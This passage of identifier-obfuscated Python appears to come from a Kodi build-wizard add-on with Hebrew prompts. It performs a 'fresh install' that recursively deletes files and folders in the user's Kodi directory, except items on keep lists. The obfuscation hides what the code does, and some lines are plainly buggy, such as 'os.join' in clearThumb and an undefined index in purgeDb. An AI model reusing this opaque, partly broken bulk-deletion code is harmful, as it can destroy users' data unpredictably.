				elif O0OO000OO000O0OO0 =='MyVideos116.db'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4938
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4939
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4940
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'skin.Premium.mod'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4941
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4942
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'skin.phenomenal'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4943
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4944
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'skin.titan'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4946
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4947
				elif O0OO000OO000O0OO0 =='sources.xml'and OO0O0000OOO00OOO0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4949
				elif O0OO000OO000O0OO0 =='quicknav.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4952
				elif O0OO000OO000O0OO0 =='x1101.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4953
				elif O0OO000OO000O0OO0 =='b-srtym-b.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4954
				elif O0OO000OO000O0OO0 =='x1102.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4955
				elif O0OO000OO000O0OO0 =='b-sdrvt-b.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4956
				elif O0OO000OO000O0OO0 =='x1112.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4957
				elif O0OO000OO000O0OO0 =='b-tlvvyzyh-b.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4958
				elif O0OO000OO000O0OO0 =='x1111.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4959
				elif O0OO000OO000O0OO0 =='b-tvknyshrly-b.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4960
				elif O0OO000OO000O0OO0 =='x1110.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4961
				elif O0OO000OO000O0OO0 =='b-yldym-b.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4962
				elif O0OO000OO000O0OO0 =='x1114.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4963
				elif O0OO000OO000O0OO0 =='b-mvzyqh-b.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4964
				elif O0OO000OO000O0OO0 =='mainmenu.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4965
				elif O0OO000OO000O0OO0 =='skin.Premium.mod.properties'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4966
				elif O0OO000OO000O0OO0 =='x1122.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4968
				elif O0OO000OO000O0OO0 =='b-spvrt-b.DATA.xml'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4969
				elif O0OO000OO000O0OO0 =='favourites.xml'and OO0O0000OOO00OOO0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4974
				elif O0OO000OO000O0OO0 =='guisettings.xml'and OO0O0000OOO00OOO0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4976
				elif O0OO000OO000O0OO0 =='profiles.xml'and OO0O0000OOO00OOO0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4977
				elif O0OO000OO000O0OO0 =='advancedsettings.xml'and OO0O0000OOO00OOO0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4978
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4979
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'program.apollo'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4980
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4981
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.telemedia'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4982
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.elementum'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4985
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4987
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'weather.yahoo'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4988
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.quasar'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4989
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'program.apollo'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4990
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4991
				elif OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4992
				elif O0OO000OO000O0OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%O0OO000OO000O0OO0 ,xbmc .LOGNOTICE )#line:4993
				elif O0OO000OO000O0OO0 .endswith ('.db'):#line:4994
					try :#line:4995
						if O0OO000OO000O0OO0 ==OOOO000O000OOO0OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0OO000OO000O0OO0 ,KODIV ),xbmc .LOGNOTICE )#line:4996
						else :os .remove (os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ))#line:4997
					except Exception as O0O00O000OOOOO000 :#line:4998
						if not O0OO000OO000O0OO0 .startswith ('Textures13'):#line:4999
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5000
							wiz .log ("-> %s"%(str (O0O00O000OOOOO000 )),xbmc .LOGNOTICE )#line:5001
							wiz .purgeDb (os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ))#line:5002
				else :#line:5003
					DP .update (int (wiz .percentage (OO0O0OO000O0O0OOO ,OO0O000OOOO00O000 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000OO000O0OO0 ),'')#line:5004
					try :os .remove (os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ))#line:5005
					except Exception as O0O00O000OOOOO000 :#line:5006
						wiz .log ("Error removing %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:5007
						wiz .log ("-> / %s"%(str (O0O00O000OOOOO000 )),xbmc .LOGNOTICE )#line:5008
			if DP .iscanceled ():#line:5009
				DP .close ()#line:5010
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5011
				return False #line:5012
		for O0OO0000OO00OOO00 ,OOOO0OOO0OOO0O0OO ,O0OOO0O00OO0OO0OO in os .walk (OO000O0OOOOO000O0 ,topdown =True ):#line:5013
			OOOO0OOO0OOO0O0OO [:]=[O0O00O00O00O000OO for O0O00O00O00O000OO in OOOO0OOO0OOO0O0OO if O0O00O00O00O000OO not in EXCLUDES ]#line:5014
			for O0OO000OO000O0OO0 in OOOO0OOO0OOO0O0OO :#line:5015
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO000OO000O0OO0 ),'')#line:5016
			  if O0OO000OO000O0OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5017
			   if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5018
			    if not (O0OO000OO000O0OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5020
			      if not (O0OO000OO000O0OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5021
			       if not (O0OO000OO000O0OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5022
			        if not (O0OO000OO000O0OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5023
			         if not (O0OO000OO000O0OO0 =='program.apollo'and KEEPINFO =='true'):#line:5024
			          if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5025
			           if not (O0OO000OO000O0OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5026
			            if not (O0OO000OO000O0OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5027
			             if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5028
			              if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5029
			               if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5030
			                if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5031
			                 if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5032
			                  if not (O0OO000OO000O0OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5033
			                   if not (O0OO000OO000O0OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5034
			                    if not (O0OO000OO000O0OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5035
			                     if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5036
			                      if not (O0OO000OO000O0OO0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5037
			                       if not (O0OO000OO000O0OO0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5038
			                           if not (O0OO000OO000O0OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5042
			                            if not (O0OO000OO000O0OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5043
			                             if not (O0OO000OO000O0OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5044
			                              if not (O0OO000OO000O0OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5045
			                               if not (O0OO000OO000O0OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5046
			                                  shutil .rmtree (os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),ignore_errors =True ,onerror =None )#line:5048
			if DP .iscanceled ():#line:5049
				DP .close ()#line:5050
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5051
				return False #line:5052
		DP .close ()#line:5053
		wiz .clearS ('build')#line:5054
		if over ==True :#line:5055
			return True #line:5056
		elif install =='restore':#line:5057
			return True #line:5058
		elif install :#line:5059
			buildWizard (install ,'normal',over =True )#line:5060
		else :#line:5061
			if INSTALLMETHOD ==1 :O00OO0OOO0O000O00 =1 #line:5062
			elif INSTALLMETHOD ==2 :O00OO0OOO0O000O00 =0 #line:5063
			else :O00OO0OOO0O000O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5064
			if O00OO0OOO0O000O00 ==1 :wiz .reloadFix ('fresh')#line:5065
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5066
	else :#line:5067
		if not install =='restore':#line:5068
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5069
			wiz .refresh ()#line:5070
def clearCache ():#line:5075
		wiz .clearCache ()#line:5076
def fixwizard ():#line:5080
		wiz .fixwizard ()#line:5081
def totalClean ():#line:5083
		wiz .clearCache ()#line:5085
		wiz .clearPackages ('total')#line:5086
		clearThumb ('total')#line:5087
		cleanfornewbuild ()#line:5088
def cleanfornewbuild ():#line:5089
		try :#line:5090
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5091
		except :#line:5092
			pass #line:5093
		try :#line:5094
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5095
		except :#line:5096
			pass #line:5097
		try :#line:5098
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5099
		except :#line:5100
			pass #line:5101
def clearThumb (type =None ):#line:5102
	OO00O0O0O0O00OOO0 =wiz .latestDB ('Textures')#line:5103
	if not type ==None :OOO000O0OO0O00O00 =1 #line:5104
	else :OOO000O0OO0O00O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O0O0O0O00OOO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5105
	if OOO000O0OO0O00O00 ==1 :#line:5106
		try :wiz .removeFile (os .join (DATABASE ,OO00O0O0O0O00OOO0 ))#line:5107
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O0O0O0O00OOO0 )#line:5108
		wiz .removeFolder (THUMBS )#line:5109
	else :wiz .log ('Clear thumbnames cancelled')#line:5111
	wiz .redoThumbs ()#line:5112
def purgeDb ():#line:5114
	OOOO0O0O00O00O0O0 =[];O00OO0OO00OOO0OOO =[]#line:5115
	for O00O0O0000000O0OO ,O0OO0OOO0O0000O0O ,O0OOOOO0OOO0OOOOO in os .walk (HOME ):#line:5116
		for O0OOOO0O0O0000000 in fnmatch .filter (O0OOOOO0OOO0OOOOO ,'*.db'):#line:5117
			if O0OOOO0O0O0000000 !='Thumbs.db':#line:5118
				O00OOOO00O0OO0OO0 =os .path .join (O00O0O0000000O0OO ,O0OOOO0O0O0000000 )#line:5119
				OOOO0O0O00O00O0O0 .append (O00OOOO00O0OO0OO0 )#line:5120
				O000OOOO000OO0O0O =O00OOOO00O0OO0OO0 .replace ('\\','/').split ('/')#line:5121
				O00OO0OO00OOO0OOO .append ('(%s) %s'%(O000OOOO000OO0O0O [len (O000OOOO000OO0O0O )-2 ],O000OOOO000OO0O0O [len (O000OOOO000OO0O0O )-1 ]))#line:5122
	if KODIV >=16 :#line:5123
		OOO0O0O0O0000OO00 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OO0OO00OOO0OOO )#line:5124
		if OOO0O0O0O0000OO00 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5125
		elif len (OOO0O0O0O0000OO00 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5126
		else :#line:5127
			for O0O000OOOOO0OOOOO in OOO0O0O0O0000OO00 :wiz .purgeDb (OOOO0O0O00O00O0O0 [O0O000OOOOO0OOOOO ])#line:5128
	else :#line:5129
		OOO0O0O0O0000OO00 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OO0OO00OOO0OOO )#line:5130
		if OOO0O0O0O0000OO00 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5131
		else :wiz .purgeDb (OOOO0O0O00O00O0O0 [O0O000OOOOO0OOOOO ])#line:5132
def fastupdatefirstbuild (OO0OOOOOOO0O0O00O ):#line:5138
